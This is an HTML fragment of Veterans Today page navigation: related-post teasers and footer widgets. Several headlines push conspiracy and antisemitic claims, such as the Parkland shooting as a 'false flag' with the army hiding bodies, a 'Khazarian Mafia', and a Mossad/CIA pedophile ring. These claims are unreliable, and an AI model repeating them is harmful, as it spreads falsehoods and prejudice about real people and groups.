<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2017/11/17/the-second-hijacking-of-america/" rel="bookmark" title="The Second Hijacking of America">The Second Hijacking of America</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/jim/">Preston James, Ph.D</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2017-11-17T18:56:13+00:00">November 17, 2017</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2017/11/17/the-second-hijacking-of-america/#comments">16</a></div> </div>
</div>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/01/26/super-nuke/" rel="bookmark" title="False flag Super Bowl nuke alert">False flag Super Bowl nuke alert</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/barrett/">Kevin Barrett</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-01-26T09:42:12+00:00">January 26, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/01/26/super-nuke/#comments">23</a></div> </div>
</div>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/13/keeping-trump-and-netanyahu-out-of-jail-israel-plans-sneak-attack-on-syria-with-trump-russia-betrayed/" rel="bookmark" title="Keeping Trump and Netanyahu Out of Jail: Israel Plans Sneak Attack on Syria with Trump, Russia Betrayed">Keeping Trump and Netanyahu Out of Jail: Israel Plans Sneak Attack on Syria with...</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/gordonduff/">Gordon Duff, Senior Editor</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-13T10:03:17+00:00">March 13, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/13/keeping-trump-and-netanyahu-out-of-jail-israel-plans-sneak-attack-on-syria-with-trump-russia-betrayed/#comments">45</a></div> </div>
</div>
 </div>
</div> </div>
<div class="td-block-row">
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/01/07/review-the-jesuit-order-as-a-synagogue-of-jews-part-one/" rel="bookmark" title="Review: The Jesuit Order as a Synagogue of Jews – Part One">Review: The Jesuit Order as a Synagogue of Jews – Part One</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/admin/">VT</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-01-07T01:22:15+00:00">January 7, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/01/07/review-the-jesuit-order-as-a-synagogue-of-jews-part-one/#comments">20</a></div> </div>
</div>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/02/16/florida/" rel="bookmark" title="ANOTHER Florida false flag? Drills, multiple shooters, army hiding bodies, MSM coverup">ANOTHER Florida false flag? Drills, multiple shooters, army hiding bodies, MSM coverup</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/barrett/">Kevin Barrett</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-02-16T16:52:20+00:00">February 16, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/02/16/florida/#comments">14</a></div> </div>
</div>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2017/11/04/a-new-war-in-lebanon-syria-iraq-and-beyond-on-the-way/" rel="bookmark" title="Breaking: A New War in Lebanon, Syria, Iraq and Beyond on the Way">Breaking: A New War in Lebanon, Syria, Iraq and Beyond on the Way</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/gordonduff/">Gordon Duff, Senior Editor</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2017-11-04T09:46:03+00:00">November 4, 2017</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2017/11/04/a-new-war-in-lebanon-syria-iraq-and-beyond-on-the-way/#comments">11</a></div> </div>
</div>
</div>
</div> </div>
<div class="td-block-row">
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/01/russia-warns-the-us-and-israel-your-games-are-at-an-end/" rel="bookmark" title="Russia Warns the US and Israel, &#8220;Your Games are at an End!&#8221;">Russia Warns the US and Israel, &#8220;Your Games are at an End!&#8221;</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/gordonduff/">Gordon Duff, Senior Editor</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-01T10:53:45+00:00">March 1, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/01/russia-warns-the-us-and-israel-your-games-are-at-an-end/#comments">19</a></div> </div>
</div>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/02/11/vt-was-right-israeli-airstrikes-were-complete-failure/" rel="bookmark" title="VT WAS RIGHT: Israeli Airstrikes Were Complete Failure, Retaliation Against Russia Expected">VT WAS RIGHT: Israeli Airstrikes Were Complete Failure, Retaliation Against Russia Expected</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/iangreenhalgh/">Ian Greenhalgh</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-02-11T13:59:06+00:00">February 11, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/02/11/vt-was-right-israeli-airstrikes-were-complete-failure/#comments">24</a></div> </div>
</div>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2017/11/27/breakthrough-video-case-for-war-with-israel-over-9-11/" rel="bookmark" title="Breakthrough: Video Case for War with Israel Over 9/11">Breakthrough: Video Case for War with Israel Over 9/11</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/gordonduff/">Gordon Duff, Senior Editor</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2017-11-27T10:14:28+00:00">November 27, 2017</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2017/11/27/breakthrough-video-case-for-war-with-israel-over-9-11/#comments">21</a></div> </div>
</div>
</div>
</div> </div>
<div class="td-block-row">
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2017/12/15/most-americans-say-trump-should-resign-over-sex-allegations-poll/" rel="bookmark" title="Most Americans say Trump should resign over sex allegations: Poll">Most Americans say Trump should resign over sex allegations: Poll</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/presstv/">Media Partner - PressTV</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2017-12-15T02:05:09+00:00">December 15, 2017</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2017/12/15/most-americans-say-trump-should-resign-over-sex-allegations-poll/#comments">19</a></div> </div>
</div>
</div>

</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2017/10/27/kennedy-murdered-by-hard-line-faction-of-us-military-researcher/" rel="bookmark" title="TRUTH JIHAD:  Kennedy murdered by hard-line faction of US military: Researcher">TRUTH JIHAD: Kennedy murdered by hard-line faction of US military: Researcher</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/barrett/">Kevin Barrett</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2017-10-27T21:36:46+00:00">October 27, 2017</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2017/10/27/kennedy-murdered-by-hard-line-faction-of-us-military-researcher/#comments">22</a></div> </div>
</div>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2017/11/17/keshe-belgium-netherlands-child-murder-cult-exposed/" rel="bookmark" title="Keshe:  Belgium/Netherlands Child Murder Cult Exposed">Keshe: Belgium/Netherlands Child Murder Cult Exposed</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/gordonduff/">Gordon Duff, Senior Editor</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2017-11-17T07:56:04+00:00">November 17, 2017</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2017/11/17/keshe-belgium-netherlands-child-murder-cult-exposed/#comments">26</a></div> </div>
</div>
</div>
</div> </div>
<div class="td-block-row">
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/01/28/trumps-ties-to-mossad-cia-pedophile-ring/" rel="bookmark" title="Trump&#8217;s ties to Mossad/CIA Pedophile Ring">Trump&#8217;s ties to Mossad/CIA Pedophile Ring</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/gordonduff/">Gordon Duff, Senior Editor</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-01-28T13:44:46+00:00">January 28, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/01/28/trumps-ties-to-mossad-cia-pedophile-ring/#comments">32</a></div> </div>
</div>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/02/10/intel-drop-israeli-strike-on-syria-utter-failure/" rel="bookmark" title="Intel Drop: Israeli Strike on Syria Utter Failure">Intel Drop: Israeli Strike on Syria Utter Failure</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/gordonduff/">Gordon Duff, Senior Editor</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-02-10T16:26:50+00:00">February 10, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/02/10/intel-drop-israeli-strike-on-syria-utter-failure/#comments">30</a></div> </div>
</div>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/01/06/mossad-and-site-intelligence-inadvertently-confess-to-commanding-isis/" rel="bookmark" title="Mossad and SITE Intelligence Inadvertently Confess to Commanding ISIS">Mossad and SITE Intelligence Inadvertently Confess to Commanding ISIS</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/admin/">VT</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-01-06T03:07:40+00:00">January 6, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/01/06/mossad-and-site-intelligence-inadvertently-confess-to-commanding-isis/#comments">10</a></div> </div>
</div>
</div>
</div> </div></div></div> </div></div></div></div>
</div>
</div> 


<div class="td-footer-wrapper td-container-wrap ">
<div class="td-container">
<div class="td-pb-row">
<div class="td-pb-span12">
</div>
</div>
<div class="td-pb-row">
<div class="td-pb-span4">
<div class="td_block_wrap td_block_7 td_uid_108_5aaf778cc9dfe_rand td-pb-border-top td_block_template_1 td-column-1 td_block_padding" data-td-block-uid="td_uid_108_5aaf778cc9dfe"><script>var block_td_uid_108_5aaf778cc9dfe = new tdBlock();
block_td_uid_108_5aaf778cc9dfe.id = "td_uid_108_5aaf778cc9dfe";
block_td_uid_108_5aaf778cc9dfe.atts = '{"limit":3,"sort":"featured","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"","category_ids":"","custom_title":"EDITOR PICKS","custom_url":"","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":1,"td_ajax_preloading":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_108_5aaf778cc9dfe_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_108_5aaf778cc9dfe_rand","tdc_css_class_style":"td_uid_108_5aaf778cc9dfe_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_108_5aaf778cc9dfe.td_column_number = "1";
block_td_uid_108_5aaf778cc9dfe.block_type = "td_block_7";
block_td_uid_108_5aaf778cc9dfe.post_count = "3";
block_td_uid_108_5aaf778cc9dfe.found_posts = "625";
block_td_uid_108_5aaf778cc9dfe.header_color = "";
block_td_uid_108_5aaf778cc9dfe.ajax_pagination_infinite_stop = "";
block_td_uid_108_5aaf778cc9dfe.max_num_pages = "209";
tdBlocksArray.push(block_td_uid_108_5aaf778cc9dfe);
</script><div class="td-block-title-wrap"><h4 class="block-title"><span class="td-pulldown-size">EDITOR PICKS</span></h4></div><div id=td_uid_108_5aaf778cc9dfe class="td_block_inner">
<div class="td-block-span12">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/17/how-syrian-conflict-sparked-new-cold-war/" rel="bookmark" title="How Syrian Conflict Sparked New Cold War?"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-511-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-511-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-511-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="How Syrian Conflict Sparked New Cold War?" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/17/how-syrian-conflict-sparked-new-cold-war/" rel="bookmark" title="How Syrian Conflict Sparked New Cold War?">How Syrian Conflict Sparked New Cold War?</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-17T16:32:30+00:00">March 17, 2018</time></span> </div>
</div>
</div>
</div> 
<div class="td-block-span12">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/israel-prepares-for-war-with-russia/" rel="bookmark" title="Israel Prepares for War with Russia"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-509-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-509-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-509-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="Israel Prepares for War with Russia" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/israel-prepares-for-war-with-russia/" rel="bookmark" title="Israel Prepares for War with Russia">Israel Prepares for War with Russia</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-16T18:49:04+00:00">March 16, 2018</time></span> </div>
</div>
</div>
</div> 
<div class="td-block-span12">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/15/operation-beluga-the-plot-to-demonise-putin/" rel="bookmark" title="Operation Beluga &#8211; The Plot to Demonise Putin"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Putin-Stabbed-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Putin-Stabbed-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Putin-Stabbed-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Putin-Stabbed-683x486.jpg 683w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="Operation Beluga &#8211; The Plot to Demonise Putin" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/15/operation-beluga-the-plot-to-demonise-putin/" rel="bookmark" title="Operation Beluga &#8211; The Plot to Demonise Putin">Operation Beluga &#8211; The Plot to Demonise Putin</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-15T15:09:19+00:00">March 15, 2018</time></span> </div>
</div>
</div>
</div> </div></div>  </div>
<div class="td-pb-span4">
<div class="td_block_wrap td_block_7 td_uid_109_5aaf778ccbd3e_rand td-pb-border-top td_block_template_1 td-column-1 td_block_padding" data-td-block-uid="td_uid_109_5aaf778ccbd3e"><script>var block_td_uid_109_5aaf778ccbd3e = new tdBlock();
block_td_uid_109_5aaf778ccbd3e.id = "td_uid_109_5aaf778ccbd3e";
block_td_uid_109_5aaf778ccbd3e.atts = '{"limit":3,"sort":"popular","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"","category_ids":"","custom_title":"POPULAR POSTS","custom_url":"","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":1,"td_ajax_preloading":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_109_5aaf778ccbd3e_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_109_5aaf778ccbd3e_rand","tdc_css_class_style":"td_uid_109_5aaf778ccbd3e_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_109_5aaf778ccbd3e.td_column_number = "1";
block_td_uid_109_5aaf778ccbd3e.block_type = "td_block_7";
block_td_uid_109_5aaf778ccbd3e.post_count = "3";
block_td_uid_109_5aaf778ccbd3e.found_posts = "17822";
block_td_uid_109_5aaf778ccbd3e.header_color = "";
block_td_uid_109_5aaf778ccbd3e.ajax_pagination_infinite_stop = "";
block_td_uid_109_5aaf778ccbd3e.max_num_pages = "5941";
tdBlocksArray.push(block_td_uid_109_5aaf778ccbd3e);
</script><div class="td-block-title-wrap"><h4 class="block-title"><span class="td-pulldown-size">POPULAR POSTS</span></h4></div><div id=td_uid_109_5aaf778ccbd3e class="td_block_inner">
<div class="td-block-span12">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2017/11/10/vt-was-right-nuke-cloud-over-europe-tied-to-illegal-ukraine-arsenal-explosion/" rel="bookmark" title="VT Was Right, Nuke Cloud Over Europe Tied to Illegal Ukraine Arsenal Explosion"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2017/11/maxresdefault-4-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2017/11/maxresdefault-4-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2017/11/maxresdefault-4-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="VT Was Right, Nuke Cloud Over Europe Tied to Illegal Ukraine Arsenal Explosion" /><span class="td-video-play-ico td-video-small"><img width="20" height="20" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/video-small.png" alt="video" /></span></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2017/11/10/vt-was-right-nuke-cloud-over-europe-tied-to-illegal-ukraine-arsenal-explosion/" rel="bookmark" title="VT Was Right, Nuke Cloud Over Europe Tied to Illegal Ukraine Arsenal Explosion">VT Was Right, Nuke Cloud Over Europe Tied to Illegal Ukraine...</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2017-11-10T08:56:10+00:00">November 10, 2017</time></span> </div>
</div>
</div>
</div> 
<div class="td-block-span12">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2017/11/01/what-everyone-has-largely-ignored-about-the-weinstein-scandal/" rel="bookmark" title="What everyone has largely ignored about the Weinstein scandal"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2017/11/171009104932-harvey-weinstein-bill-clinton-2000-exlarge-169-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2017/11/171009104932-harvey-weinstein-bill-clinton-2000-exlarge-169-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2017/11/171009104932-harvey-weinstein-bill-clinton-2000-exlarge-169-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="What everyone has largely ignored about the Weinstein scandal" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2017/11/01/what-everyone-has-largely-ignored-about-the-weinstein-scandal/" rel="bookmark" title="What everyone has largely ignored about the Weinstein scandal">What everyone has largely ignored about the Weinstein scandal</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2017-11-01T10:09:59+00:00">November 1, 2017</time></span> </div>
</div>
</div>
</div> 
<div class="td-block-span12">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2017/10/21/khazarian-mafia-has-gone-mad-follows-the-french-revolutions-reign-of-terror/" rel="bookmark" title="Khazarian Mafia has Gone Mad, Follows the French Revolution’s Reign of Terror"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2017/10/download-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2017/10/download-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2017/10/download-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="Khazarian Mafia has Gone Mad, Follows the French Revolution’s Reign of Terror" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2017/10/21/khazarian-mafia-has-gone-mad-follows-the-french-revolutions-reign-of-terror/" rel="bookmark" title="Khazarian Mafia has Gone Mad, Follows the French Revolution’s Reign of Terror">Khazarian Mafia has Gone Mad, Follows the French Revolution’s Reign of...</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2017-10-21T19:05:08+00:00">October 21, 2017</time></span> </div>
</div>
</div>
</div> </div></div>  </div>
<div class="td-pb-span4">
<div class="td_block_wrap td_block_popular_categories td_uid_110_5aaf778d47740_rand widget widget_categories td-pb-border-top td_block_template_1" data-td-block-uid="td_uid_110_5aaf778d47740"><div class="td-block-title-wrap"><h4 class="block-title"><span class="td-pulldown-size">POPULAR CATEGORY</span></h4></div><ul class="td-pb-padding-side"><li><a href="https://www.veteranstoday.com/category/world-global/">World<span class="td-cat-no">3551</span></a></li><li><a href="https://www.veteranstoday.com/category/life/">Life<span class="td-cat-no">3388</span></a></li><li><a href="https://www.veteranstoday.com/category/government-and-politics/">Government<span class="td-cat-no">2906</span></a></li><li><a href="https://www.veteranstoday.com/category/wars/">WarZone<span class="td-cat-no">2195</span></a></li><li><a href="https://www.veteranstoday.com/category/false-flag-investigations/">Investigations<span class="td-cat-no">1772</span></a></li><li><a href="https://www.veteranstoday.com/category/news/veterans-administration/">Veterans Administration (VA)<span class="td-cat-no">1265</span></a></li><li><a href="https://www.veteranstoday.com/category/armed-forces/">Military<span class="td-cat-no">1258</span></a></li><li><a href="https://www.veteranstoday.com/category/world-global/middle-east-issues/">Middle East<span class="td-cat-no">706</span></a></li><li><a href="https://www.veteranstoday.com/category/government-and-politics/corruption/">Corruption<span class="td-cat-no">531</span></a></li></ul></div>  </div>
</div>
</div>
<div class="td-footer-bottom-full">
<div class="td-container">
<div class="td-pb-row">
<div class="td-pb-span3"><aside class="footer-logo-wrap"><a href="https://www.veteranstoday.com/"><img class="td-retina-data" src="https://www.veteranstoday.com/wp-content/uploads/2017/10/76x76.png" data-retina="https://www.veteranstoday.com/wp-content/uploads/2017/10/152x152.png" alt="VT logo" title="Alternative Media for U.S. Veterans" width="76" /></a></aside></div><div class="td-pb-span5"><aside class="footer-text-wrap"><div class="block-title"><span>ABOUT US</span></div>VT is dedicated to providing comprehensive information and news to U.S Military Veterans. It is part of the Veterans Today Network<div class="footer-email-wrap">Contact us: <a href="/cdn-cgi/l/email-protection#cab9bfbabaa5b8be8abcafbeafb8aba4b9bea5aeabb3a4afbebda5b8a1e4a9a5a7"><span class="__cf_email__" data-cfemail="394a4c4949564b4d794f5c4d5c4b58574a4d565d5840575c4d4e564b52175a5654">[email&#160;protected]</span></a></div></aside></div><div class="td-pb-span4"><aside class="footer-social-wrap td-social-style-2"><div class="block-title"><span>FOLLOW US</span></div>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://www.facebook.com/Veterans-Today-Network-170917822620" title="Facebook">
<i class="td-icon-font td-icon-facebook"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://plus.google.com/u/0/+Veteranstodaynetwork" title="Google+">
<i class="td-icon-font td-icon-googleplus"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="/cdn-cgi/l/email-protection#deadabaeaeb1acaa9ea8bbaabbacbfb0adaab1babfa7b0bbaaa9b1acb5f0bdb1b3" title="Mail">
<i class="td-icon-font td-icon-mail-1"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://www.veteranstoday.com/feed/" title="RSS">
<i class="td-icon-font td-icon-rss"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://soundcloud.com/veteranstoday" title="Soundcloud">
<i class="td-icon-font td-icon-soundcloud"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://www.twitter.com/veteranstoday" title="Twitter">
<i class="td-icon-font td-icon-twitter"></i>
</a>
</span>
<span class="td-social-icon-wrap">
<a target="_blank" href="https://www.youtube.com/channel/UC2Vba5-IAh9kxID8ExsikFw" title="Youtube">
<i class="td-icon-font td-icon-youtube"></i>
</a>
</span></aside></div> </div>
</div>
</div>
</div>

<div class="td-sub-footer-container td-container-wrap ">
<div class="td-container">
<div class="td-pb-row">
<div class="td-pb-span td-sub-footer-menu">
<div class="menu-network-menu-container"><ul id="menu-network-menu-1" class="td-subfooter-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-first td-menu-item td-normal-menu menu-item-467534"><a href="https://www.veteranstoday.com/contact/">Resources</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-470897"><a href="https://www.veteranstodayjobs.com/career-center-employment/" target="_blank" rel="nofollow">Job Center</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-467538"><a href="https://www.veteranstoday.com/pollsarchive/">Polls</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page td-menu-item td-normal-menu menu-item-467537"><a href="https://www.veteranstoday.com/custom-weapons/">Custom Weapons</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-400961"><a href="https://vtradio.airtime.pro/" target="_blank" rel="nofollow">VT Radio</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children td-menu-item td-normal-menu menu-item-362182"><a title="Download Android and IPhone VT Apps for Free" href="https://www.veteranstoday.com/apps/">Apps</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-400963"><a href="https://play.google.com/store/apps/details?id=com.optime.veterantoday" target="_blank">VT APP (Android)</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-400964"><a href="https://itunes.apple.com/us/app/veterans-today-network/id1016778550?mt=8" target="_blank" rel="nofollow">VT App (Iphone)</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-465971"><a href="https://www.zazzle.com/veteranstodaynetwork" target="_blank">Store</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom td-menu-item td-normal-menu menu-item-400983"><a href="http://visitor.r20.constantcontact.com/d.jsp?llr=6pxle4bab&#038;p=oi&#038;m=1101630135805&#038;sit=tc7usvicb&#038;f=f7780006-9f66-4b6e-ad5b-e7700b11ac27" target="_blank" rel="nofollow">Newsletter</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children td-menu-item td-normal-menu menu-item-467533"><a href="https://www.veteranstoday.com/contact/">Contact</a>
<ul class="sub-menu">
